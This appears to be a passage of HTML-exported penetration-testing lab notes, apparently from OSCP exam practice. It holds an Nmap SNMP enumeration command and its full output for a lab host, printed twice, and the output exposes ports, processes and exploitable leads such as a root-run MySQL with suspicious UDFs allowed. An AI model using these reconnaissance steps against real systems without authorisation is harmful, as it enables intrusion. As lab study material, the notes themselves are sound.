0 error(s) and 10 item(s) reported on remote host<br />+ End Time:           2020-05-20 11:46:19 (GMT-4) (1866 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>snmp</h1><br/>Nmap done: 1 IP address (1 host up) scanned in 6311.68 seconds<br />root@CoolHandKali:/Yeet/Machines/OSCP/Exam/82# nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 192.168.38.82<br />Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 12:18 EDT<br />NSE: Loaded 47 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 12:18<br />Completed NSE at 12:18, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 12:18<br />Completed NSE at 12:18, 0.00s elapsed<br />Initiating UDP Scan at 12:18<br />Scanning rocinante.localdomain (192.168.38.82) [2 ports]<br />Discovered open port 161/udp on 192.168.38.82<br />Completed UDP Scan at 12:18, 1.38s elapsed (2 total ports)<br />Initiating Service scan at 12:18<br />Scanning 2 services on rocinante.localdomain (192.168.38.82)<br />Completed Service scan at 12:19, 97.58s elapsed (2 services on 1 host)<br />NSE: Script scanning 192.168.38.82.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 12:19<br />Completed NSE at 12:20, 6.59s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 12:20<br />Completed NSE at 12:20, 1.00s elapsed<br />Nmap scan report for rocinante.localdomain (192.168.38.82)<br />Host is up, received user-set (0.033s latency).<br />Scanned at 2020-05-20 12:18:20 EDT for 107s<br /><br />PORT    STATE         SERVICE  REASON              VERSION<br />161/udp open          snmp     udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)<br />| snmp-info: <br />|   enterprise: net-snmp<br />|   engineIDFormat: unknown<br />|   engineIDData: 023bec20efa3825c<br />|   snmpEngineBoots: 27<br />|_  snmpEngineTime: 22h20m04s<br />| snmp-netstat: <br />|   TCP  0.0.0.0:22           0.0.0.0:0<br />|   TCP  0.0.0.0:25           0.0.0.0:0<br />|   TCP  0.0.0.0:80           0.0.0.0:0<br />|   TCP  0.0.0.0:2222         0.0.0.0:0<br />|   TCP  0.0.0.0:3128         0.0.0.0:0<br />|   TCP  0.0.0.0:3306         0.0.0.0:0<br />|   TCP  127.0.0.1:46786      127.0.1.1:80<br />|   TCP  127.0.0.1:46790      127.0.1.1:80<br />|   TCP  127.0.0.1:46792      127.0.1.1:80<br />|   TCP  127.0.0.1:46794      127.0.1.1:80<br />|   TCP  127.0.0.1:46796      127.0.1.1:80<br />|   TCP  127.0.0.1:46798      127.0.1.1:80<br />|   TCP  127.0.0.1:46800      127.0.1.1:80<br />|   TCP  127.0.1.1:80         127.0.0.1:46722<br />|   TCP  127.0.1.1:80         127.0.0.1:46724<br />|   TCP  127.0.1.1:80         127.0.0.1:46726<br />|   TCP  127.0.1.1:80         127.0.0.1:46728<br />|   TCP  127.0.1.1:80         127.0.0.1:46730<br />|   TCP  127.0.1.1:80         127.0.0.1:46732<br />|   TCP  127.0.1.1:80         127.0.0.1:46734<br />|   TCP  127.0.1.1:80         127.0.0.1:46736<br />|   TCP  127.0.1.1:80         127.0.0.1:46738<br />|   TCP  127.0.1.1:80         127.0.0.1:46740<br />|   TCP  127.0.1.1:80         127.0.0.1:46742<br />|   TCP  127.0.1.1:80         127.0.0.1:46744<br />|   TCP  127.0.1.1:80         127.0.0.1:46746<br />|   TCP  127.0.1.1:80         127.0.0.1:46748<br />|   TCP  127.0.1.1:80         127.0.0.1:46750<br />|   TCP  127.0.1.1:80         127.0.0.1:46752<br />|   TCP  127.0.1.1:80         127.0.0.1:46754<br />|   TCP  127.0.1.1:80         127.0.0.1:46756<br />|   TCP  127.0.1.1:80         127.0.0.1:46758<br />|   TCP  127.0.1.1:80         127.0.0.1:46760<br />|   TCP  127.0.1.1:80         127.0.0.1:46762<br />|   TCP  127.0.1.1:80         127.0.0.1:46764<br />|   TCP  127.0.1.1:80         127.0.0.1:46766<br />|   TCP  127.0.1.1:80         127.0.0.1:46768<br />|   TCP  127.0.1.1:80         127.0.0.1:46770<br />|   TCP  127.0.1.1:80         127.0.0.1:46772<br />|   TCP  127.0.1.1:80         127.0.0.1:46774<br />|   TCP  127.0.1.1:80         127.0.0.1:46776<br />|   TCP  127.0.1.1:80         127.0.0.1:46778<br />|   TCP  127.0.1.1:80         127.0.0.1:46780<br />|   TCP  127.0.1.1:80         127.0.0.1:46782<br />|   TCP  127.0.1.1:80         127.0.0.1:46784<br />|   TCP  127.0.1.1:80         127.0.0.1:46786<br />|   TCP  127.0.1.1:80         127.0.0.1:46788<br />|   TCP  127.0.1.1:80         127.0.0.1:46790<br />|   TCP  127.0.1.1:80         127.0.0.1:46794<br />|   TCP  127.0.1.1:80         127.0.0.1:46798<br />|   TCP  192.168.38.82:3128   192.168.19.38:52192<br />|   TCP  192.168.38.82:3128   192.168.19.38:55442<br />|   TCP  192.168.38.82:3128   192.168.19.38:55488<br />|   TCP  192.168.38.82:3128   192.168.19.38:55530<br />|   TCP  192.168.38.82:3128   192.168.19.38:55572<br />|   TCP  192.168.38.82:3128   192.168.19.38:55614<br />|   TCP  192.168.38.82:3128   192.168.19.38:55656<br />|   TCP  192.168.38.82:3128   192.168.19.38:55698<br />|   TCP  192.168.38.82:3128   192.168.19.38:55738<br />|   TCP  192.168.38.82:3128   192.168.19.38:55778<br />|   TCP  192.168.38.82:3128   192.168.19.38:55828<br />|   TCP  192.168.38.82:3128   192.168.19.38:55836<br />|   TCP  192.168.38.82:3128   192.168.19.38:55846<br />|   TCP  192.168.38.82:3128   192.168.19.38:55854<br />|   TCP  192.168.38.82:3128   192.168.19.38:55866<br />|   TCP  192.168.38.82:3128   192.168.19.38:55876<br />|   TCP  192.168.38.82:3128   192.168.19.38:55902<br />|   TCP  192.168.38.82:3128   192.168.19.38:55928<br />|   TCP  192.168.38.82:3128   192.168.19.38:55954<br />|   TCP  192.168.38.82:3128   192.168.19.38:55976<br />|   TCP  192.168.38.82:3128   192.168.19.38:55982<br />|   TCP  192.168.38.82:3128   192.168.19.38:55990<br />|   TCP  192.168.38.82:3128   192.168.19.38:55998<br />|   TCP  192.168.38.82:3128   192.168.19.38:56000<br />|   TCP  192.168.38.82:3128   192.168.19.38:56002<br />|   TCP  192.168.38.82:3128   192.168.19.38:56008<br />|   TCP  192.168.38.82:3128   192.168.19.38:56010<br />|   TCP  192.168.38.82:3128   192.168.19.38:56014<br />|   TCP  192.168.38.82:3128   192.168.19.38:56016<br />|   TCP  192.168.38.82:3128   192.168.19.38:56026<br />|   TCP  192.168.38.82:3128   192.168.19.38:56034<br />|   TCP  192.168.38.82:3128   192.168.19.38:56060<br />|   TCP  192.168.38.82:3128   192.168.19.38:56076<br />|   TCP  192.168.38.82:3128   192.168.19.38:56084<br />|   TCP  192.168.38.82:3128   192.168.19.38:56086<br />|   TCP  192.168.38.82:3128   192.168.19.38:56094<br />|   TCP  192.168.38.82:3128   192.168.19.38:56096<br />|   TCP  192.168.38.82:3128   192.168.19.38:56112<br />|   TCP  192.168.38.82:3128   192.168.19.38:56124<br />|   TCP  192.168.38.82:3128   192.168.19.38:56138<br />|   TCP  192.168.38.82:3128   192.168.19.38:56162<br />|   TCP  192.168.38.82:3128   192.168.19.38:56164<br />|   TCP  192.168.38.82:3128   192.168.19.38:56166<br />|   TCP  192.168.38.82:3128   192.168.19.38:56172<br />|   TCP  192.168.38.82:3128   192.168.19.38:56184<br />|   TCP  192.168.38.82:3128   192.168.19.38:56186<br />|   TCP  192.168.38.82:3128   192.168.19.38:56190<br />|   TCP  192.168.38.82:3128   192.168.19.38:56194<br />|   TCP  192.168.38.82:3128   192.168.19.38:56196<br />|   TCP  192.168.38.82:3128   192.168.19.38:56202<br />|   TCP  192.168.38.82:3128   192.168.19.38:56206<br />|   TCP  192.168.38.82:3128   192.168.19.38:56208<br />|   TCP  192.168.38.82:3128   192.168.19.38:56212<br />|   TCP  192.168.38.82:3128   192.168.19.38:56244<br />|   TCP  192.168.38.82:3128   192.168.19.38:56246<br />|   TCP  192.168.38.82:3128   192.168.19.38:56248<br />|   TCP  192.168.38.82:3128   192.168.19.38:56250<br />|   TCP  192.168.38.82:3128   192.168.19.38:56252<br />|   TCP  192.168.38.82:3128   192.168.19.38:56262<br />|   TCP  192.168.38.82:3128   192.168.19.38:56268<br />|   TCP  192.168.38.82:3128   192.168.19.38:56270<br />|   TCP  192.168.38.82:3128   192.168.19.38:56296<br />|   TCP  192.168.38.82:3128   192.168.19.38:56310<br />|   TCP  192.168.38.82:3128   192.168.19.38:56314<br />|   TCP  192.168.38.82:3128   192.168.19.38:56316<br />|   TCP  192.168.38.82:3128   192.168.19.38:56320<br />|   TCP  192.168.38.82:3128   192.168.19.38:56328<br />|   TCP  192.168.38.82:3128   192.168.19.38:56332<br />|   TCP  192.168.38.82:3128   192.168.19.38:56334<br />|   TCP  192.168.38.82:3128   192.168.19.38:56336<br />|   TCP  192.168.38.82:3128   192.168.19.38:56338<br />|   TCP  192.168.38.82:3128   192.168.19.38:56340<br />|   TCP  192.168.38.82:3128   192.168.19.38:56342<br />|   TCP  192.168.38.82:3128   192.168.19.38:56346<br />|   TCP  192.168.38.82:3128   192.168.19.38:56348<br />|   TCP  192.168.38.82:3128   192.168.19.38:56350<br />|   TCP  192.168.38.82:3128   192.168.19.38:56352<br />|   TCP  192.168.38.82:3128   192.168.19.38:56354<br />|   UDP  0.0.0.0:161          *:*<br />|_  UDP  0.0.0.0:58385        *:*<br />| snmp-processes: <br />|   1: <br />|     Name: systemd<br />|     Path: /sbin/init<br />|   2: <br />|     Name: kthreadd<br />|   3: <br />|     Name: ksoftirqd/0<br />|   5: <br />|     Name: kworker/0:0H<br />|   6: <br />|     Name: kworker/u2:0<br />|   7: <br />|     Name: rcu_sched<br />|   8: <br />|     Name: rcu_bh<br />|   9: <br />|     Name: migration/0<br />|   10: <br />|     Name: lru-add-drain<br />|   11: <br />|     Name: watchdog/0<br />|   12: <br />|     Name: cpuhp/0<br />|   13: <br />|     Name: kdevtmpfs<br />|   14: <br />|     Name: netns<br />|   15: <br />|     Name: khungtaskd<br />|   16: <br />|     Name: oom_reaper<br />|   17: <br />|     Name: writeback<br />|   18: <br />|     Name: kcompactd0<br />|   19: <br />|     Name: ksmd<br />|   21: <br />|     Name: khugepaged<br />|   22: <br />|     Name: crypto<br />|   23: <br />|     Name: kintegrityd<br />|   24: <br />|     Name: bioset<br />|   25: <br />|     Name: kblockd<br />|   26: <br />|     Name: devfreq_wq<br />|   27: <br />|     Name: watchdogd<br />|   28: <br />|     Name: kswapd0<br />|   29: <br />|     Name: vmstat<br />|   41: <br />|     Name: kthrotld<br />|   42: <br />|     Name: ipv6_addrconf<br />|   76: <br />|     Name: bioset<br />|   77: <br />|     Name: bioset<br />|   78: <br />|     Name: bioset<br />|   79: <br />|     Name: bioset<br />|   80: <br />|     Name: bioset<br />|   81: <br />|     Name: bioset<br />|   82: <br />|     Name: bioset<br />|   83: <br />|     Name: bioset<br />|   85: <br />|     Name: ata_sff<br />|   86: <br />|     Name: mpt_poll_0<br />|   87: <br />|     Name: mpt/0<br />|   105: <br />|     Name: scsi_eh_0<br />|   106: <br />|     Name: scsi_tmf_0<br />|   107: <br />|     Name: bioset<br />|   108: <br />|     Name: scsi_eh_1<br />|   109: <br />|     Name: scsi_tmf_1<br />|   111: <br />|     Name: scsi_eh_2<br />|   113: <br />|     Name: scsi_tmf_2<br />|   115: <br />|     Name: kworker/u2:2<br />|   128: <br />|     Name: bioset<br />|   130: <br />|     Name: kworker/0:1H<br />|   157: <br />|     Name: kworker/u3:0<br />|   166: <br />|     Name: jbd2/sda1-8<br />|   167: <br />|     Name: ext4-rsv-conver<br />|   197: <br />|     Name: systemd-journal<br />|     Path: /lib/systemd/systemd-journald<br />|   202: <br />|     Name: vmtoolsd<br />|     Path: /usr/bin/vmtoolsd<br />|   203: <br />|     Name: kauditd<br />|   228: <br />|     Name: systemd-udevd<br />|     Path: /lib/systemd/systemd-udevd<br />|   275: <br />|     Name: systemd-timesyn<br />|     Path: /lib/systemd/systemd-timesyncd<br />|   325: <br />|     Name: ttm_swap<br />|   457: <br />|     Name: VGAuthService<br />|     Path: /usr/bin/VGAuthService<br />|   458: <br />|     Name: dbus-daemon<br />|     Path: /usr/bin/dbus-daemon<br />|     Params: --system --address=systemd: --nofork --nopidfile --systemd-activation<br />|   496: <br />|     Name: systemd-logind<br />|     Path: /lib/systemd/systemd-logind<br />|   498: <br />|     Name: cron<br />|     Path: /usr/sbin/cron<br />|     Params: -f<br />|   500: <br />|     Name: rsyslogd<br />|     Path: /usr/sbin/rsyslogd<br />|     Params: -n<br />|   522: <br />|     Name: mysqld_safe<br />|     Path: /bin/bash<br />|     Params: /usr/bin/mysqld_safe --user=root --allow-suspicious-udfs<br />|   533: <br />|     Name: snmpd<br />|     Path: /usr/sbin/snmpd<br />|     Params: -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f<br />|   547: <br />|     Name: agetty<br />|     Path: /sbin/agetty<br />|     Params: --noclear tty1 linux<br />|   581: <br />|     Name: sshd<br />|     Path: /usr/sbin/sshd<br />|     Params: -D<br />|   583: <br />|     Name: systemd<br />|     Path: /lib/systemd/systemd<br />|     Params: --user<br />|   618: <br />|     Name: (sd-pam)<br />|     Path: (sd-pam)<br />|   659: <br />|     Name: paramiko_2.4.0_<br />|     Path: /usr/bin/python2<br />|     Params: /usr/local/bin/paramiko_2.4.0_sftpserver.py 0.0.0.0 2222 /etc/ssl/roci_rsa.key<br />|   677: <br />|     Name: squid<br />|     Path: /usr/sbin/squid<br />|     Params: -YC -f /etc/squid/squid.conf<br />|   686: <br />|     Name: squid<br />|     Path: (squid-1)<br />|     Params: -YC -f /etc/squid/squid.conf<br />|   764: <br />|     Name: apache2<br />|     Path: /usr/sbin/apache2<br />|     Params: -k start<br />|   765: <br />|     Name: apache2<br />|     Path: /usr/sbin/apache2<br />|     Params: -k start<br />|   766: <br />|     Name: apache2<br />|     Path: /usr/sbin/apache2<br />|     Params: -k start<br />|   821: <br />|     Name: log_file_daemon<br />|     Path: (logfile-daemon)<br />|     Params: /var/log/squid/access.log<br />|   938: <br />|     Name: mysqld<br />|     Path: /usr/sbin/mysqld<br />|     Params: --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/i386-linux-gnu/mariadb18/plugin --user=root --allow-suspicious-udf<br />|   939: <br />|     Name: logger<br />|     Path: logger<br />|     Params: -t mysqld -p daemon error<br />|   1068: <br />|     Name: master<br />|     Path: /usr/lib/postfix/sbin/master<br />|     Params: -w<br />|   1380: <br />|     Name: qmgr<br />|     Path: qmgr<br />|     Params: -l -t unix -u<br />|   1486: <br />|     Name: systemd-network<br />|     Path: /lib/systemd/systemd-networkd<br />|   4235: <br />|     Name: pinger<br />|     Path: (pinger)<br />|   4805: <br />|     Name: tlsmgr<br />|     Path: tlsmgr<br />|     Params: -l -t unix -u -c<br />|   5177: <br />|     Name: pickup<br />|     Path: pickup<br />|     Params: -l -t unix -u -c<br />|   5346: <br />|     Name: kworker/0:1<br />|   5370: <br />|     Name: kworker/0:2<br />|   5387: <br />|_    Name: kworker/0:0<br />162/udp open|filtered snmptrap no-response<br />Service Info: Host: rocinante<br /></div><div class='page'><h1 class='title level-6'>snmp</h1><br/>PORT    STATE         SERVICE  REASON              VERSION<br />161/udp open          snmp     udp-response ttl 63 SNMPv1 server; net-snmp SNMPv3 server (public)<br />| snmp-info: <br />|   enterprise: net-snmp<br />|   engineIDFormat: unknown<br />|   engineIDData: 023bec20efa3825c<br />|   snmpEngineBoots: 27<br />|_  snmpEngineTime: 22h20m04s<br />| snmp-netstat: <br />|   TCP  0.0.0.0:22           0.0.0.0:0<br />|   TCP  0.0.0.0:25           0.0.0.0:0<br />|   TCP  0.0.0.0:80           0.0.0.0:0<br />|   TCP  0.0.0.0:2222         0.0.0.0:0<br />|   TCP  0.0.0.0:3128         0.0.0.0:0<br />|   TCP  0.0.0.0:3306         0.0.0.0:0<br />|   TCP  127.0.0.1:46786      127.0.1.1:80<br />|   TCP  127.0.0.1:46790      127.0.1.1:80<br />|   TCP  127.0.0.1:46792      127.0.1.1:80<br />|   TCP  127.0.0.1:46794      127.0.1.1:80<br />|   TCP  127.0.0.1:46796      127.0.1.1:80<br />|   TCP  127.0.0.1:46798      127.0.1.1:80<br />|   TCP  127.0.0.1:46800      127.0.1.1:80<br />|   TCP  127.0.1.1:80         127.0.0.1:46722<br />|   TCP  127.0.1.1:80         127.0.0.1:46724<br />|   TCP  127.0.1.1:80         127.0.0.1:46726<br />|   TCP  127.0.1.1:80         127.0.0.1:46728<br />|   TCP  127.0.1.1:80         127.0.0.1:46730<br />|   TCP  127.0.1.1:80         127.0.0.1:46732<br />|   TCP  127.0.1.1:80         127.0.0.1:46734<br />|   TCP  127.0.1.1:80         127.0.0.1:46736<br />|   TCP  127.0.1.1:80         127.0.0.1:46738<br />|   TCP  127.0.1.1:80         127.0.0.1:46740<br />|   TCP  127.0.1.1:80         127.0.0.1:46742<br />|   TCP  127.0.1.1:80         127.0.0.1:46744<br />|   TCP  127.0.1.1:80         127.0.0.1:46746<br />|   TCP  127.0.1.1:80         127.0.0.1:46748<br />|   TCP  127.0.1.1:80         127.0.0.1:46750<br />|   TCP  127.0.1.1:80         127.0.0.1:46752<br />|   TCP  127.0.1.1:80         127.0.0.1:46754<br />|   TCP  127.0.1.1:80         127.0.0.1:46756<br />|   TCP  127.0.1.1:80         127.0.0.1:46758<br />|   TCP  127.0.1.1:80         127.0.0.1:46760<br />|   TCP  127.0.1.1:80         127.0.0.1:46762<br />|   TCP  127.0.1.1:80         127.0.0.1:46764<br />|   TCP  127.0.1.1:80         127.0.0.1:46766<br />|   TCP  127.0.1.1:80         127.0.0.1:46768<br />|   TCP  127.0.1.1:80         127.0.0.1:46770<br />|   TCP  127.0.1.1:80         127.0.0.1:46772<br />|   TCP  127.0.1.1:80         127.0.0.1:46774<br />|   TCP  127.0.1.1:80         127.0.0.1:46776<br />|   TCP  127.0.1.1:80         127.0.0.1:46778<br />|   TCP  127.0.1.1:80         127.0.0.1:46780<br />|   TCP  127.0.1.1:80         127.0.0.1:46782<br />|   TCP  127.0.1.1:80         127.0.0.1:46784<br />|   TCP  127.0.1.1:80         127.0.0.1:46786<br />|   TCP  127.0.1.1:80         127.0.0.1:46788<br />|   TCP  127.0.1.1:80         127.0.0.1:46790<br />|   TCP  127.0.1.1:80         127.0.0.1:46794<br />|   TCP  127.0.1.1:80         127.0.0.1:46798<br />|   TCP  192.168.38.82:3128   192.168.19.38:52192<br />|   TCP  192.168.38.82:3128   192.168.19.38:55442<br />|   TCP  192.168.38.82:3128   192.168.19.38:55488<br />|   TCP  192.168.38.82:3128   192.168.19.38:55530<br />|   TCP  192.168.38.82:3128   192.168.19.38:55572<br />|   TCP  192.168.38.82:3128   192.168.19.38:55614<br />|   TCP  192.168.38.82:3128   192.168.19.38:55656<br />|   TCP  192.168.38.82:3128   192.168.19.38:55698<br />|   TCP  192.168.38.82:3128   192.168.19.38:55738<br />|   TCP  192.168.38.82:3128   192.168.19.38:55778<br />|   TCP  192.168.38.82:3128   192.168.19.38:55828<br />|   TCP  192.168.38.82:3128   192.168.19.38:55836<br />|   TCP  192.168.38.82:3128   192.168.19.38:55846<br />|   TCP  192.168.38.82:3128   192.168.19.38:55854<br />|   TCP  192.168.38.82:3128   192.168.19.38:55866<br />|   TCP  192.168.38.82:3128   192.168.19.38:55876<br />|   TCP  192.168.38.82:3128   192.168.19.38:55902<br />|   TCP  192.168.38.82:3128   192.168.19.38:55928<br />|   TCP  192.168.38.82:3128   192.168.19.38:55954<br />|   TCP  192.168.38.82:3128   192.168.19.38:55976<br />|   TCP  192.168.38.82:3128   192.168.19.38:55982<br />|   TCP  192.168.38.82:3128   192.168.19.38:55990<br />|   TCP  192.168.38.82:3128   192.168.19.38:55998<br />|   TCP  192.168.38.82:3128   192.168.19.38:56000<br />|   TCP  192.168.38.82:3128   192.168.19.38:56002<br />|   TCP  192.168.38.82:3128   192.168.19.38:56008<br />|   TCP  192.168.38.82:3128   192.168.19.38:56010<br />|   TCP  192.168.38.82:3128   192.168.19.38:56014<br />|   TCP  192.168.38.82:3128   192.168.19.38:56016<br />|   TCP  192.168.38.82:3128   192.168.19.38:56026<br />|   TCP  192.168.38.82:3128   192.168.19.38:56034<br />|   TCP  192.168.38.82:3128   192.168.19.38:56060<br />|   TCP  192.168.38.82:3128   192.168.19.38:56076<br />|   TCP  192.168.38.82:3128   192.168.19.38:56084<br />|   TCP  192.168.38.82:3128   192.168.19.38:56086<br />|   TCP  192.168.38.82:3128   192.168.19.38:56094<br />|   TCP  192.168.38.82:3128   192.168.19.38:56096<br />|   TCP  192.168.38.82:3128   192.168.19.38:56112<br />|   TCP  192.168.38.82:3128   192.168.19.38:56124<br />|   TCP  192.168.38.82:3128   192.168.19.38:56138<br />|   TCP  192.168.38.82:3128   192.168.19.38:56162<br />|   TCP  192.168.38.82:3128   192.168.19.38:56164<br />|   TCP  192.168.38.82:3128   192.168.19.38:56166<br />|   TCP  192.168.38.82:3128   192.168.19.38:56172<br />|   TCP  192.168.38.82:3128   192.168.19.38:56184<br />|   TCP  192.168.38.82:3128   192.168.19.38:56186<br />|   TCP  192.168.38.82:3128   192.168.19.38:56190<br />|   TCP  192.168.38.82:3128   192.168.19.38:56194<br />|   TCP  192.168.38.82:3128   192.168.19.38:56196<br />|   TCP  192.168.38.82:3128   192.168.19.38:56202<br />|   TCP  192.168.38.82:3128   192.168.19.38:56206<br />|   TCP  192.168.38.82:3128   192.168.19.38:56208<br />|   TCP  192.168.38.82:3128   192.168.19.38:56212<br />|   TCP  192.168.38.82:3128   192.168.19.38:56244<br />|   TCP  192.168.38.82:3128   192.168.19.38:56246<br />|   TCP  192.168.38.82:3128   192.168.19.38:56248<br />|   TCP  192.168.38.82:3128   192.168.19.38:56250<br />|   TCP  192.168.38.82:3128   192.168.19.38:56252<br />|   TCP  192.168.38.82:3128   192.168.19.38:56262<br />|   TCP  192.168.38.82:3128   192.168.19.38:56268<br />|   TCP  192.168.38.82:3128   192.168.19.38:56270<br />|   TCP  192.168.38.82:3128   192.168.19.38:56296<br />|   TCP  192.168.38.82:3128   192.168.19.38:56310<br />|   TCP  192.168.38.82:3128   192.168.19.38:56314<br />|   TCP  192.168.38.82:3128   192.168.19.38:56316<br />|   TCP  192.168.38.82:3128   192.168.19.38:56320<br />|   TCP  192.168.38.82:3128   192.168.19.38:56328<br />|   TCP  192.168.38.82:3128   192.168.19.38:56332<br />|   TCP  192.168.38.82:3128   192.168.19.38:56334<br />|   TCP  192.168.38.82:3128   192.168.19.38:56336<br />|   TCP  192.168.38.82:3128   192.168.19.38:56338<br />|   TCP  192.168.38.82:3128   192.168.19.38:56340<br />|   TCP  192.168.38.82:3128   192.168.19.38:56342<br />|   TCP  192.168.38.82:3128   192.168.19.38:56346<br />|   TCP  192.168.38.82:3128   192.168.19.38:56348<br />|   TCP  192.168.38.82:3128   192.168.19.38:56350<br />|   TCP  192.168.38.82:3128   192.168.19.38:56352<br />|   TCP  192.168.38.82:3128   192.168.19.38:56354<br />|   UDP  0.0.0.0:161          *:*<br />|_  UDP  0.0.0.0:58385        *:*<br />| snmp-processes: <br />|   1: <br />|     Name: systemd<br />|     Path: /sbin/init<br />|   2: <br />|     Name: kthreadd<br />|   3: <br />|     Name: ksoftirqd/0<br />|   5: <br />|     Name: kworker/0:0H<br />|   6: <br />|     Name: kworker/u2:0<br />|   7: <br />|     Name: rcu_sched<br />|   8: <br />|     Name: rcu_bh<br />|   9: <br />|     Name: migration/0<br />|   10: <br />|     Name: lru-add-drain<br />|   11: <br />|     Name: watchdog/0<br />|   12: <br />|     Name: cpuhp/0<br />|   13: <br />|     Name: kdevtmpfs<br />|   14: <br />|     Name: netns<br />|   15: <br />|     Name: khungtaskd<br />|   16: <br />|     Name: oom_reaper<br />|   17: <br />|     Name: writeback<br />|   18: <br />|     Name: kcompactd0<br />|   19: <br />|     Name: ksmd<br />|   21: <br />|     Name: khugepaged<br />|   22: <br />|     Name: crypto<br />|   23: <br />|     Name: kintegrityd<br />|   24: <br />|     Name: bioset<br />|   25: <br />|     Name: kblockd<br />|   26: <br />|     Name: devfreq_wq<br />|   27: <br />|     Name: watchdogd<br />|   28: <br />|     Name: kswapd0<br />|   29: <br />|     Name: vmstat<br />|   41: <br />|     Name: kthrotld<br />|   42: <br />|     Name: ipv6_addrconf<br />|   76: <br />|     Name: bioset<br />|   77: <br />|     Name: bioset<br />|   78: <br />|     Name: bioset<br />|   79: <br />|     Name: bioset<br />|   80: <br />|     Name: bioset<br />|   81: <br />|     Name: bioset<br />|   82: <br />|     Name: bioset<br />|   83: <br />|     Name: bioset<br />|   85: <br />|     Name: ata_sff<br />|   86: <br />|     Name: mpt_poll_0<br />|   87: <br />|     Name: mpt/0<br />|   105: <br />|     Name: scsi_eh_0<br />|   106: <br />|     Name: scsi_tmf_0<br />|   107: <br />|     Name: bioset<br />|   108: <br />|     Name: scsi_eh_1<br />|   109: <br />|     Name: scsi_tmf_1<br />|   111: <br />|     Name: scsi_eh_2<br />|   113: <br />|     Name: scsi_tmf_2<br />|   115: <br />|     Name: kworker/u2:2<br />|   128: <br />|     Name: bioset<br />|   130: <br />|     Name: kworker/0:1H<br />|   157: <br />|     Name: kworker/u3:0<br />|   166: <br />|     Name: jbd2/sda1-8<br />|   167: <br />|     Name: ext4-rsv-conver<br />|   197: <br />|     Name: systemd-journal<br />|     Path: /lib/systemd/systemd-journald<br />|   202: <br />|     Name: vmtoolsd<br />|     Path: /usr/bin/vmtoolsd<br />|   203: <br />|     Name: kauditd<br />|   228: <br />|     Name: systemd-udevd<br />|     Path: /lib/systemd/systemd-udevd<br />|   275: <br />|     Name: systemd-timesyn<br />|     Path: /lib/systemd/systemd-timesyncd<br />|   325: <br />|     Name: ttm_swap<br />|   457: <br />|     Name: VGAuthService<br />|     Path: /usr/bin/VGAuthService<br />|   458: <br />|     Name: dbus-daemon<br />|     Path: /usr/bin/dbus-daemon<br />|     Params: --system --address=systemd: --nofork --nopidfile --systemd-activation<br />|   496: <br />|     Name: systemd-logind<br />|     Path: /lib/systemd/systemd-logind<br />|   498: <br />|     Name: cron<br />|     Path: /usr/sbin/cron<br />|     Params: -f<br />|   500: <br />|     Name: rsyslogd<br />|     Path: /usr/sbin/rsyslogd<br />|     Params: -n<br />|   522: <br />|     Name: mysqld_safe<br />|     Path: /bin/bash<br />|     Params: /usr/bin/mysqld_safe --user=root --allow-suspicious-udfs<br />|   533: <br />|     Name: snmpd<br />|     Path: /usr/sbin/snmpd<br />|     Params: -Lsd -Lf /dev/null -u Debian-snmp -g Debian-snmp -I -smux mteTrigger mteTriggerConf -f<br />|   547: <br />|     Name: agetty<br />|     Path: /sbin/agetty<br />|     Params: --noclear tty1 linux<br />|   581: <br />|     Name: sshd<br />|     Path: /usr/sbin/sshd<br />|     Params: -D<br />|   583: <br />|     Name: systemd<br />|     Path: /lib/systemd/systemd<br />|     Params: --user<br />|   618: <br />|     Name: (sd-pam)<br />|     Path: (sd-pam)<br />|   659: <br />|     Name: paramiko_2.4.0_<br />|     Path: /usr/bin/python2<br />|     Params: /usr/local/bin/paramiko_2.4.0_sftpserver.py 0.0.0.0 2222 /etc/ssl/roci_rsa.key<br />|   677: <br />|     Name: squid<br />|     Path: /usr/sbin/squid<br />|     Params: -YC -f /etc/squid/squid.conf<br />|   686: <br />|     Name: squid<br />|     Path: (squid-1)<br />|     Params: -YC -f /etc/squid/squid.conf<br />|   764: <br />|     Name: apache2<br />|     Path: /usr/sbin/apache2<br />|     Params: -k start<br />|   765: <br />|     Name: apache2<br />|     Path: /usr/sbin/apache2<br />|     Params: -k start<br />|   766: <br />|     Name: apache2<br />|     Path: /usr/sbin/apache2<br />|     Params: -k start<br />|   821: <br />|     Name: log_file_daemon<br />|     Path: (logfile-daemon)<br />|     Params: /var/log/squid/access.log<br />|   938: <br />|     Name: mysqld<br />|     Path: /usr/sbin/mysqld<br />|     Params: --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/i386-linux-gnu/mariadb18/plugin --user=root --allow-suspicious-udf<br />|   939: <br />|     Name: logger<br />|     Path: logger<br />|     Params: -t mysqld -p daemon error<br />|   1068: <br />|     Name: master<br />|     Path: /usr/lib/postfix/sbin/master<br />|     Params: -w<br />|   1380: <br />|     Name: qmgr<br />|     Path: qmgr<br />|     Params: -l -t unix -u<br />|   1486: <br />|     Name: systemd-network<br />|     Path: /lib/systemd/systemd-networkd<br />|   4235: <br />|     Name: pinger<br />|     Path: (pinger)<br />|   4805: <br />|     Name: tlsmgr<br />|     Path: tlsmgr<br />|     Params: -l -t unix -u -c<br />|   5177: <br />|     Name: pickup<br />|     Path: pickup<br />|     Params: -l -t unix -u -c<br />|   5346: <br />|     Name: kworker/0:1<br />|   5370: <br />|     Name: kworker/0:2<br />|   5387: <br />|_    Name: kworker/0:0<br />162/udp open|filtered snmptrap no-response<br />Service Info: Host: rocinante<br /><br /></div><div class='page'><h1 class='title level-5'>Pictures</h1><br/><a href=""><img src="images/1110-1.png" alt="images/1110-1.png" /></a><br /><br /><a href=""><img src="images/1110-2.png" alt="images/1110-2.png" /></a><br /><br /><a href=""><img src="images/1110-3.png" alt="images/1110-3.png" /></a></div><div class='page'><h1 class='title level-4'>192.168.38.110 BOF rooted 